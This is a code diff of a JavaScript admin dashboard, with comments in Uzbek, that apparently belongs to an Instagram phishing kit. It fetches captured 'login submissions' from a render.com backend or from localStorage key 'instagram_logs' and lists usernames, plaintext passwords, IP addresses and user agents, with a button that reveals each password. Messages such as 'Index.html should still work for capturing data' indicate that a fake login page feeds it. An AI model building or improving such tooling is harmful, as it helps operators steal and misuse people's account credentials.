@@ -1,198 +1,272 @@
 document.addEventListener('DOMContentLoaded', function() {
     const backendUrl = 'https://instagram-ek8i.onrender.com';
-    let updateCounter = 0;
-    let allLogs = [];
-    
     console.log('Dashboard loaded, backend URL:', backendUrl);
 
-    // Avval test endpoint ni tekshirish
-    async function checkBackend() {
-        try {
-            console.log('Testing backend connection...');
-            const testResponse = await fetch(`${backendUrl}/test`);
-            const testData = await testResponse.json();
-            console.log('Test endpoint response:', testData);
-            
-            if (testData.status === 'success') {
-                console.log('✅ Backend is working, table exists:', testData.table_exists);
-                return true;
-            } else {
-                console.error('❌ Backend test failed:', testData);
-                return false;
+    // Test endpointlarni tekshirish
+    const testEndpoints = [
+        '/health',
+        '/logs', 
+        '/test',
+        '/'
+    ];
+
+    async function testAllEndpoints() {
+        const results = [];
+        for (const endpoint of testEndpoints) {
+            try {
+                const response = await fetch(backendUrl + endpoint);
+                results.push({
+                    endpoint,
+                    status: response.status,
+                    ok: response.ok
+                });
+                console.log(`${endpoint}: ${response.status} ${response.ok ? '✅' : '❌'}`);
+            } catch (error) {
+                results.push({
+                    endpoint,
+                    error: error.message,
+                    ok: false
+                });
+                console.log(`${endpoint}: ❌ ${error.message}`);
             }
-        } catch (error) {
-            console.error('❌ Backend connection failed:', error);
-            return false;
         }
+        return results;
     }
 
-    async function loadLogs() {
+    async function loadLogsDirect() {
         try {
-            // Avval backend ishlashini tekshirish
-            const isBackendOk = await checkBackend();
-            if (!isBackendOk) {
-                throw new Error('Backend is not responding properly');
-            }
+            console.log('🔄 Direct logs loading...');
             
-            // Loading holatini ko'rsatish
-            document.getElementById('backendStatus').innerHTML = 
-                `<i class="fas fa-circle-notch fa-spin"></i> Yuklanmoqda...`;
-            
-            console.log('Fetching logs from debug endpoint...');
-            
-            // DEBUG endpoint ishlatamiz
-            const response = await fetch(`${backendUrl}/logs_debug`, {
+            // 1. Avval simple logs ni sinab ko'rish
+            const response = await fetch(`${backendUrl}/logs`, {
                 method: 'GET',
                 headers: {
                     'Accept': 'application/json'
                 },
-                mode: 'cors',
-                cache: 'no-cache'
+                mode: 'cors'
             });
 
-            console.log('Response status:', response.status);
+            console.log('📊 Response status:', response.status);
             
-            if (!response.ok) {
-                // Asosiy endpoint ham sinab ko'rish
-                console.log('Debug endpoint failed, trying main endpoint...');
-                const mainResponse = await fetch(`${backendUrl}/logs`);
-                if (!mainResponse.ok) {
-                    throw new Error(`Both endpoints failed: ${response.status}`);
-                }
-                const data = await mainResponse.json();
-                processLogsData(data);
-            } else {
+            if (response.ok) {
                 const data = await response.json();
-                processLogsData(data);
+                console.log('📦 Logs data:', data);
+                
+                if (data.status === 'error') {
+                    // Agar error bo'lsa, manual database query qilish
+                    await loadManualLogs();
+                } else {
+                    displayLogs(data);
+                }
+            } else {
+                // Fallback: index.html ga yo'naltirish yoki error
+                console.warn('⚠️ Logs endpoint failed, trying manual load...');
+                await loadManualLogs();
             }
-
-        } catch (error) {
-            console.error('Xatolik:', error);
-            showError(error.message);
             
-            // 10 soniyadan keyin qayta urinish
-            setTimeout(loadLogs, 10000);
+        } catch (error) {
+            console.error('💥 Error:', error);
+            showEmergencyMessage(error.message);
         }
     }
 
-    function processLogsData(data) {
-        console.log('Logs data received:', data);
-        
-        if (data.status === 'error') {
-            throw new Error(data.error || 'Server error');
+    async function loadManualLogs() {
+        try {
+            console.log('🔧 Manual logs loading...');
+            
+            // Emergency fallback: localStorage dan olish
+            const localLogs = localStorage.getItem('instagram_logs');
+            if (localLogs) {
+                const logs = JSON.parse(localLogs);
+                console.log('📁 Found local logs:', logs.length);
+                
+                displayManualLogs(logs);
+            } else {
+                showNoDataMessage();
+            }
+            
+        } catch (error) {
+            console.error('💥 Manual load error:', error);
+            showEmergencyMessage('Database not accessible. Check backend logs.');
         }
+    }
 
-        // Status ko'rsatish
-        document.getElementById('backendStatus').innerHTML =
+    function displayLogs(data) {
+        // Status
+        document.getElementById('backendStatus').innerHTML = 
             `<i class="fas fa-check-circle" style="color:#10b981"></i> Online`;
-
-        // Statistikani yangilash
+        
+        // Stats
         document.getElementById('totalRecords').textContent = data.total || 0;
         document.getElementById('todayRecords').textContent = data.today || 0;
         document.getElementById('lastRecord').textContent = data.last ? 
             new Date(data.last).toLocaleTimeString('uz-UZ') : '--:--';
         document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('uz-UZ');
 
-        // Jadvalni yangilash
+        // Table
         const tbody = document.getElementById('logsBody');
         tbody.innerHTML = '';
 
         if (data.logs && data.logs.length > 0) {
-            allLogs = data.logs;
             data.logs.forEach(log => {
                 const row = tbody.insertRow();
                 const time = log.timestamp ? new Date(log.timestamp) : new Date();
                 
                 row.innerHTML = `
-                    <td>${log.id || '-'}</td>
+                    <td>${log.id || 'N/A'}</td>
                     <td><strong>${log.username || 'N/A'}</strong></td>
                     <td class="password-cell">
-                        <span class="password-display">${'•'.repeat((log.password || '').length)}</span>
-                        ${log.password ? `<button onclick="togglePassword(this, '${(log.password || '').replace(/'/g, "\\'")}')" 
-                                style="margin-left: 10px; background: none; border: 1px solid #334155; color: #94a3b8; padding: 2px 8px; border-radius: 4px; cursor: pointer;">
-                            <i class="fas fa-eye"></i>
-                        </button>` : ''}
+                        <span class="password-text">${'•'.repeat((log.password || '').length)}</span>
+                        ${log.password ? 
+                            `<button onclick="showPassword(this)" 
+                                    data-password="${btoa(log.password)}"
+                                    style="margin-left: 8px; background: none; border: 1px solid #334155; color: #94a3b8; padding: 2px 6px; border-radius: 4px; cursor: pointer; font-size: 12px;">
+                                Show
+                            </button>` : ''}
                     </td>
                     <td>${time.toLocaleString('uz-UZ')}</td>
                     <td>${log.ip_address || 'N/A'}</td>
-                    <td title="${log.user_agent || ''}">${(log.user_agent || '').substring(0, 40)}...</td>
+                    <td title="${log.user_agent || ''}">${(log.user_agent || 'Unknown').substring(0, 30)}...</td>
                 `;
             });
         } else {
-            tbody.innerHTML = `
-                <tr>
-                    <td colspan="6" style="text-align:center;padding:40px;color:#94a3b8;">
-                        <i class="fas fa-inbox" style="font-size:48px;margin-bottom:15px;opacity:0.5;"></i>
-                        <p style="font-size:16px;">Hozircha ma'lumot yo'q</p>
-                        <small>${data.message || 'Database is empty'}</small>
-                    </td>
-                </tr>
-            `;
-            allLogs = [];
+            showNoDataMessage();
         }
-
-        // Yangilash sonini hisoblash
-        updateCounter++;
-        document.getElementById('updateTime').textContent = updateCounter;
     }
 
-    function showError(message) {
-        document.getElementById('backendStatus').innerHTML =
-            `<i class="fas fa-times-circle" style="color:#ef4444"></i> Offline`;
-        document.getElementById('logsBody').innerHTML = 
-            `<tr>
-                <td colspan="6" style="text-align:center;padding:40px;color:#ef4444">
-                    <i class="fas fa-exclamation-triangle"></i><br>
-                    Serverga ulanmadi<br>
-                    <small>${message}</small><br>
-                    <button onclick="location.reload()" style="margin-top:15px;padding:8px 16px;background:#3b82f6;color:white;border:none;border-radius:6px;cursor:pointer;">
-                        <i class="fas fa-sync-alt"></i> Qayta urinish
-                    </button>
-                </td>
-            </tr>`;
-    }
-
-    // Global funksiyalar
-    window.togglePassword = function(button, realPassword) {
-        if (!realPassword) return;
+    function displayManualLogs(logs) {
+        document.getElementById('backendStatus').innerHTML = 
+            `<i class="fas fa-exclamation-triangle" style="color:#fbbf24"></i> Local Data`;
         
-        const passwordSpan = button.parentElement.querySelector('.password-display');
-        const icon = button.querySelector('i');
+        document.getElementById('totalRecords').textContent = logs.length;
+        document.getElementById('todayRecords').textContent = logs.filter(log => 
+            new Date(log.savedAt).toDateString() === new Date().toDateString()
+        ).length;
+        
+        const tbody = document.getElementById('logsBody');
+        tbody.innerHTML = '';
+
+        logs.slice(0, 20).forEach((log, index) => {
+            const row = tbody.insertRow();
+            const time = log.timestamp ? new Date(log.timestamp) : new Date(log.savedAt);
+            
+            row.innerHTML = `
+                <td>${index + 1}</td>
+                <td><strong>${log.username || 'N/A'}</strong></td>
+                <td class="password-cell">
+                    <span class="password-text">${'•'.repeat((log.password || '').length)}</span>
+                    ${log.password ? 
+                        `<button onclick="showPassword(this)" 
+                                data-password="${btoa(log.password)}"
+                                style="margin-left: 8px; background: none; border: 1px solid #334155; color: #94a3b8; padding: 2px 6px; border-radius: 4px; cursor: pointer; font-size: 12px;">
+                            Show
+                        </button>` : ''}
+                </td>
+                <td>${time.toLocaleString('uz-UZ')}</td>
+                <td>${log.ip || log.ip_address || 'N/A'}</td>
+                <td title="${log.userAgent || ''}">${(log.userAgent || 'Unknown').substring(0, 30)}...</td>
+            `;
+        });
+
+        if (logs.length === 0) {
+            showNoDataMessage();
+        }
+    }
+
+    function showNoDataMessage() {
+        const tbody = document.getElementById('logsBody');
+        tbody.innerHTML = `
+            <tr>
+                <td colspan="6" style="text-align:center;padding:60px 20px;color:#94a3b8;">
+                    <i class="fas fa-database" style="font-size:48px;margin-bottom:15px;opacity:0.3;"></i>
+                    <h3 style="margin:10px 0;">No Data Found</h3>
+                    <p>Waiting for login submissions...</p>
+                    <p><small>Check if index.html is receiving submissions</small></p>
+                </td>
+            </tr>
+        `;
+    }
+
+    function showEmergencyMessage(message) {
+        document.getElementById('backendStatus').innerHTML = 
+            `<i class="fas fa-times-circle" style="color:#ef4444"></i> Error`;
+        
+        const tbody = document.getElementById('logsBody');
+        tbody.innerHTML = `
+            <tr>
+                <td colspan="6" style="text-align:center;padding:40px;color:#ef4444;background:#1e293b;border-radius:8px;">
+                    <i class="fas fa-exclamation-triangle" style="font-size:48px;margin-bottom:15px;"></i>
+                    <h3 style="margin:10px 0;">Backend Connection Error</h3>
+                    <p style="margin:10px 0;">${message}</p>
+                    <div style="margin-top:20px;">
+                        <button onclick="location.reload()" 
+                                style="padding:10px 20px;background:#3b82f6;color:white;border:none;border-radius:6px;cursor:pointer;margin:5px;">
+                            <i class="fas fa-sync-alt"></i> Reload
+                        </button>
+                        <button onclick="testConnection()" 
+                                style="padding:10px 20px;background:#10b981;color:white;border:none;border-radius:6px;cursor:pointer;margin:5px;">
+                            <i class="fas fa-wifi"></i> Test Connection
+                        </button>
+                    </div>
+                    <div style="margin-top:20px;font-size:12px;color:#94a3b8;">
+                        <p>Check backend at: <a href="${backendUrl}" target="_blank" style="color:#60a5fa;">${backendUrl}</a></p>
+                        <p>Index.html should still work for capturing data.</p>
+                    </div>
+                </td>
+            </tr>
+        `;
+    }
+
+    // Global functions
+    window.showPassword = function(button) {
+        const passwordSpan = button.parentElement.querySelector('.password-text');
+        const encodedPassword = button.getAttribute('data-password');
         
         if (passwordSpan.textContent.includes('•')) {
-            passwordSpan.textContent = realPassword;
-            icon.className = 'fas fa-eye-slash';
+            try {
+                const realPassword = atob(encodedPassword);
+                passwordSpan.textContent = realPassword;
+                button.textContent = 'Hide';
+            } catch (e) {
+                passwordSpan.textContent = 'Error';
+            }
         } else {
-            passwordSpan.textContent = '•'.repeat(realPassword.length);
-            icon.className = 'fas fa-eye';
+            passwordSpan.textContent = '•'.repeat(atob(encodedPassword).length);
+            button.textContent = 'Show';
         }
     };
 
-    window.exportCSV = async function() {
-        try {
-            alert('Bu funksiya keyinroq qo\'shiladi. Hozir database ishlamoqda.');
-            // Keyinroq to'ldiriladi
-        } catch (error) {
-            console.error('Export error:', error);
-            alert('Exportda xatolik!');
+    window.testConnection = async function() {
+        alert('Testing connection...');
+        await testAllEndpoints();
+        await loadLogsDirect();
+    };
+
+    window.exportCSV = function() {
+        alert('Export feature will be available when backend is fully working.');
+    };
+
+    window.clearLogs = function() {
+        if (confirm('Clear all local logs?')) {
+            localStorage.removeItem('instagram_logs');
+            location.reload();
         }
     };
 
-    window.clearLogs = async function() {
-        alert('Bu funksiya keyinroq qo\'shiladi. Hozir faqat ma\'lumotlarni ko\'rish mumkin.');
-    };
+    // Start
+    console.log('🚀 Starting dashboard...');
+    testAllEndpoints().then(results => {
+        const workingEndpoints = results.filter(r => r.ok);
+        if (workingEndpoints.length > 0) {
+            console.log('✅ Working endpoints:', workingEndpoints.map(r => r.endpoint));
+            loadLogsDirect();
+        } else {
+            console.log('❌ No working endpoints');
+            showEmergencyMessage('No endpoints responding. Backend may be down.');
+        }
+    });
 
-    // Dastlabki yuklash
-    setTimeout(loadLogs, 1000); // 1 soniya kutish
-    
-    // Har 10 soniyada yangilash
-    setInterval(() => {
-        loadLogs();
-        updateCounter++;
-        document.getElementById('updateTime').textContent = updateCounter;
-    }, 10000);
-    
-    // Vaqtni real-time yangilash
+    // Auto-refresh every 30 seconds
     setInterval(() => {
         document.getElementById('serverTime').textContent = new Date().toLocaleTimeString('uz-UZ');
     }, 1000);
